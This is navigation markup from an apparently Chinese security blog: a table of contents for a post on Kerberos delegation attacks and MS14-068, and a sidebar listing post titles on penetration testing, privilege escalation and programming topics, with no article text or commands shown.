class="toc-link" href="#ADFind"><span class="toc-number">10.2.</span> <span class="toc-text">ADFind</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ldapsearch"><span class="toc-number">10.3.</span> <span class="toc-text">ldapsearch</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">11.</span> <span class="toc-text">非约束委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA%E5%B8%90%E5%8F%B7"><span class="toc-number">11.1.</span> <span class="toc-text">查找非约束委派主机帐号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE"><span class="toc-number">11.2.</span> <span class="toc-text">导出票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-number">11.3.</span> <span class="toc-text">注入票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7"><span class="toc-number">11.4.</span> <span class="toc-text">访问域控</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">12.</span> <span class="toc-text">约束性委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%B4%A6%E5%8F%B7"><span class="toc-number">12.1.</span> <span class="toc-text">查找约束性委派的主机账号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E7%94%A8%E6%88%B7TGT"><span class="toc-number">12.2.</span> <span class="toc-text">请求用户TGT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96ST"><span class="toc-number">12.3.</span> <span class="toc-text">获取ST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5ST2"><span class="toc-number">12.4.</span> <span class="toc-text">注入ST2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7-1"><span class="toc-number">12.5.</span> <span class="toc-text">访问域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">12.6.</span> <span class="toc-text">不知道服务用户密码的情况</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="toc-number">13.</span> <span class="toc-text">抓包分析约束性委派攻击过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REQ-1"><span class="toc-number">13.1.</span> <span class="toc-text">AS-REQ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-1"><span class="toc-number">13.2.</span> <span class="toc-text">AS-REP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%9A%84TGS-REQ%E5%92%8CTGS-REP"><span class="toc-number">13.3.</span> <span class="toc-text">第一次的TGS-REQ和TGS-REP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E7%9A%84TGS-REQ%E5%92%8CTGS-REP"><span class="toc-number">13.4.</span> <span class="toc-text">第二次的TGS-REQ和TGS-REP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">14.</span> <span class="toc-text">利用约束性委派进行权限维持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">15.</span> <span class="toc-text">域委派的防御措施</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PAC"><span class="toc-number">16.</span> <span class="toc-text">PAC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MS14-068"><span class="toc-number">17.</span> <span class="toc-text">MS14-068</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E7%A5%A8%E6%8D%AE"><span class="toc-number">17.1.</span> <span class="toc-text">生成票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mimikatz%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-number">17.2.</span> <span class="toc-text">mimikatz导入票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7-2"><span class="toc-number">17.3.</span> <span class="toc-text">访问域控</span></a></li></ol></li></ol>
            </div>
        
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 75
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
        
            
            
            <div class="archive-year"> 2088 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/08</span>
            <a class="archive-post-title" href="/2088/08/08/readme/">README</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2021 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/03</span>
            <a class="archive-post-title" href="/2021/10/03/UAC%E6%8F%90%E6%9D%83/">CVE-2019-1388 UAC提权</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/03</span>
            <a class="archive-post-title" href="/2021/10/03/RPC%E6%8F%90%E6%9D%83/">RPC提权</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/03</span>
            <a class="archive-post-title" href="/2021/10/03/msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/">msf生成木马小结</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/03</span>
            <a class="archive-post-title" href="/2021/10/03/nullptr/">NULL、0、nullptr 区别分析</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/17</span>
            <a class="archive-post-title" href="/2021/07/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E4%B8%8E%E7%BA%BF%E7%A8%8B%E4%BA%92%E6%96%A5/">线程同步与线程互斥</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/16</span>
            <a class="archive-post-title" href="/2021/07/16/win32%E4%B8%B4%E7%95%8C%E5%8C%BA%E4%BA%92%E6%96%A5%E4%BD%93/">临界区与互斥体</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/05</span>
            <a class="archive-post-title" href="/2021/07/05/vmtest/">一种简单的反虚拟机调试方法</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/17</span>
            <a class="archive-post-title" href="/2021/06/17/win32/">win32</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/16</span>
            <a class="archive-post-title" href="/2021/06/16/C++%E4%BA%8C%E5%8F%89%E6%A0%91/">C++二叉树实现</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/15</span>
            <a class="archive-post-title" href="/2021/06/15/C++%E9%93%BE%E8%A1%A8/">C++链表实现</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/11</span>
            <a class="archive-post-title" href="/2021/06/11/certutil%E6%8E%A2%E7%A9%B6/">certutil探究</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/10</span>
            <a class="archive-post-title" href="/2021/06/10/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%80%BB%E7%BB%93/">横向移动总结</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/09</span>
            <a class="archive-post-title" href="/2021/06/09/mimikatz/">从mimikatz抓取密码学习攻防</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/08</span>
            <a class="archive-post-title" href="/2021/06/08/LLMNR%E5%92%8CNetBIOS%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/">LLMNR和NetBIOS欺骗攻击分析及防范</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/03</span>
            <a class="archive-post-title" href="/2021/06/03/C++/">C++</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/01</span>
            <a class="archive-post-title" href="/2021/06/01/%E7%BC%96%E5%86%99exp/">如何编写属于自己的第一个exp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/29</span>
            <a class="archive-post-title" href="/2021/05/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/28</span>
            <a class="archive-post-title" href="/2021/05/28/moonsec/">vulnhub靶场实战</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/27</span>
            <a class="archive-post-title" href="/2021/05/27/5%E6%9C%88%E7%A2%8E%E7%A2%8E%E5%BF%B5/">5月碎碎念</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/26</span>
            <a class="archive-post-title" href="/2021/05/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BC%B9shell%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%8F%8Abypass/">渗透测试中弹shell的多种方式及bypass</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/25</span>
            <a class="archive-post-title" href="/2021/05/25/CVE-2020-1472%E8%AF%A6%E8%A7%A3/">CVE-2020-1472详解</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/23</span>
            <a class="archive-post-title" href="/2021/05/23/%E4%BB%8E%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/">从外围打点到内网渗透拿下域控</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/19</span>
            <a class="archive-post-title" href="/2021/05/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%90%91%E6%97%A5%E8%91%B5%E5%A6%99%E7%94%A8/">内网渗透之向日葵妙用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/12</span>
            <a class="archive-post-title" href="/2021/05/12/Dedecms%EF%BC%88%E7%BB%87%E6%A2%A6cms%EF%BC%89/">Dedecms(织梦cms)漏洞分析及复现</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/12</span>
            <a class="archive-post-title" href="/2021/05/12/EmpireCMS%EF%BC%88%E5%B8%9D%E5%9B%BDcms%EF%BC%89/">Empirecms(帝国cms)漏洞分析及复现</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/11</span>
            <a class="archive-post-title" href="/2021/05/11/CVE-2020-0796%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">CVE-2020-0796分析及利用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/11</span>
            <a class="archive-post-title" href="/2021/05/11/MS17_010%E6%A3%80%E6%B5%8B%E5%8F%8A%E6%89%93%E6%B3%95/">MS17_010检测及打法</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/11</span>
            <a class="archive-post-title" href="/2021/05/11/%E6%9C%A8%E9%A9%AC%E8%A7%A3%E6%9E%90&disable_fuctions/">木马解析&disable_fuctions</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/11</span>
            <a class="archive-post-title" href="/2021/05/11/%E7%AC%AC%E4%B8%80%E6%AC%A1hvv%E6%80%BB%E7%BB%93/">第一次hvv总结</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/08</span>
            <a class="archive-post-title" href="/2021/05/08/jboss%E4%B9%8BJMXInvokerServlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/">jboss之JMXInvokerServlet反序列化漏洞分析利用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/08</span>
            <a class="archive-post-title" href="/2021/05/08/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E7%9A%84n%E7%A7%8D%E5%A7%BF%E5%8A%BF/">内网穿透的n种姿势</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/06</span>
            <a class="archive-post-title" href="/2021/05/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0bypass%E5%AE%89%E5%85%A8%E7%8B%97/">文件上传bypass安全狗</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/28</span>
            <a class="archive-post-title" href="/2021/04/28/cs%E5%8A%A0%E8%BD%BD%E5%AE%8F%E4%B8%8A%E7%BA%BF%E5%88%9D%E6%8E%A2/">cs加载宏上线初探</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/27</span>
            <a class="archive-post-title" href="/2021/04/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BDPAPI%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/">内网渗透之DPAPI机制学习</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/20</span>
            <a class="archive-post-title" href="/2021/04/20/%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8/">隐藏用户的创建和使用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/19</span>
            <a class="archive-post-title" href="/2021/04/19/%E5%88%A9%E7%94%A8%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E6%9C%8D%E5%8A%A1%E6%8F%90%E5%8F%96ntds.dit/">利用卷影拷贝服务提取ntds.dit</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/17</span>
            <a class="archive-post-title" href="/2021/04/17/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%AC%BA%E9%AA%97/">中间人攻击之arp欺骗</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/15</span>
            <a class="archive-post-title" href="/2021/04/15/%E6%B5%85%E8%B0%88%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%8F%8Agpp%E8%BF%90%E7%94%A8/">浅谈域渗透中组策略及gpp运用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/14</span>
            <a class="archive-post-title" href="/2021/04/14/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E6%80%BB%E7%BB%93/">thinkphp漏洞分析与总结</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/13</span>
            <a class="archive-post-title" href="/2021/04/13/msf%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/">msf使用详解</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/13</span>
            <a class="archive-post-title" href="/2021/04/13/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%B6%85%E8%AF%A6%E7%BB%86sqlmap%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5/">sql注入之超详细sqlmap使用攻略</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/10</span>
            <a class="archive-post-title" href="/2021/04/10/windows%E8%AE%A4%E8%AF%81%E8%A7%A3%E8%AF%BB/">windows认证解读</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/09</span>
            <a class="archive-post-title" href="/2021/04/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B7%A7%E7%94%A8smb%20beacon%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/">巧用smb beacon拿下不出网主机</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/08</span>
            <a class="archive-post-title" href="/2021/04/08/phpmyadmin%E9%A1%B5%E9%9D%A2getshell/">phpmyadmin页面getshell</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/08</span>
            <a class="archive-post-title" href="/2021/04/08/windows%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%8A%93%E5%AF%86%E7%A0%81%E6%80%BB%E7%BB%93/">windows环境下抓密码总结</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/06</span>
            <a class="archive-post-title" href="/2021/04/06/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/">kerberos协议&漏洞</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/04</span>
            <a class="archive-post-title" href="/2021/04/04/Stega/">Stega</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/03</span>
            <a class="archive-post-title" href="/2021/04/03/PE/">PE</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/02</span>
            <a class="archive-post-title" href="/2021/04/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4/">内网渗透命令</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/01</span>
            <a class="archive-post-title" href="/2021/04/01/attck2/">attck3</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/01</span>
            <a class="archive-post-title" href="/2021/04/01/attck3/">attck2</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/01</span>
            <a class="archive-post-title" href="/2021/04/01/attck4/">attck4</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/01</span>
            <a class="archive-post-title" href="/2021/04/01/attck5/">attck</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/01</span>
            <a class="archive-post-title" href="/2021/04/01/tomcat/">tomcat漏洞大杂烩</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/31</span>
            <a class="archive-post-title" href="/2021/03/31/struts2/">struts2</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/30</span>
            <a class="archive-post-title" href="/2021/03/30/IPC%E5%91%BD%E4%BB%A4&%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%B8%8A%E7%BA%BF/">IPC命令&计划任务上线</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/29</span>
            <a class="archive-post-title" href="/2021/03/29/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%80%BB%E7%BB%93/">常用端口总结</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/27</span>
            <a class="archive-post-title" href="/2021/03/27/mysql%E7%A6%BB%E7%BA%BF%E8%A7%A3%E6%9E%90%E5%AF%86%E7%A0%81/">mysql离线解析密码</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/27</span>
            <a class="archive-post-title" href="/2021/03/27/%E7%BB%95%E8%BF%87CDN%E6%89%BE%E6%BA%90%E7%AB%99ip/">绕过CDN找源站ip</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/27</span>
            <a class="archive-post-title" href="/2021/03/27/%E8%AE%B0%E4%B8%80%E6%AC%A1php%E3%80%81sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%90%8E%E7%9A%84%E4%B8%80%E9%81%93ctf%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E5%A4%8D%E7%9B%98/">记一次php、sql注入学习后的一道ctf代码审计题复盘</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/26</span>
            <a class="archive-post-title" href="/2021/03/26/%E5%B0%8F%E7%99%BD%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1sql%E5%AE%9E%E6%88%98/">小白的第一次sql实战</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/23</span>
            <a class="archive-post-title" href="/2021/03/23/crackme001/">crackme001</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/23</span>
            <a class="archive-post-title" href="/2021/03/23/redis/">crackme004</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/23</span>
            <a class="archive-post-title" href="/2021/03/23/spring/">crackme002</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/23</span>
            <a class="archive-post-title" href="/2021/03/23/weblogic/">crackme003</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/23</span>
            <a class="archive-post-title" href="/2021/03/23/%E7%AA%83%E5%8F%96hash/">crackme005</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/21</span>
            <a class="archive-post-title" href="/2021/03/21/certutil&wmic%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87/">certutil&wmic绕过</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/17</span>
            <a class="archive-post-title" href="/2021/03/17/php/">php漏洞大杂烩</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/17</span>
            <a class="archive-post-title" href="/2021/03/17/vps-java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">vps-java环境配置</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/16</span>
            <a class="archive-post-title" href="/2021/03/16/jboss%E6%89%93%E5%85%A5%E5%86%85%E7%BD%91%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%96%B9%E5%BC%8F/">jboss打入内网的四种方式</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/16</span>
            <a class="archive-post-title" href="/2021/03/16/Joomla/">Joomla框架搭建&远程代码执行(RCE)漏洞复现</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/16</span>
            <a class="archive-post-title" href="/2021/03/16/sqlmap%E5%9C%A8https%E4%B8%8B%E6%8A%A5%E9%94%99%20-%20ssl%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5/">sqlmap在https下的一种错误 - ssl连接失败</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/14</span>
            <a class="archive-post-title" href="/2021/03/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80JCC%E6%8C%87%E4%BB%A4%E8%A1%A8/">汇编JCC指令表</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/13</span>
            <a class="archive-post-title" href="/2021/03/13/%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D/">写在最前</a>
        </li>
    
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
        
            <span class="sidebar-tag-name" data-tags="二进制">
                <span class="iconfont-archer">&#xe606;</span>
                二进制
            </span>
        
            <span class="sidebar-tag-name" data-tags="碎碎念">
                <span class="iconfont-archer">&#xe606;</span>
                碎碎念
            </span>
        
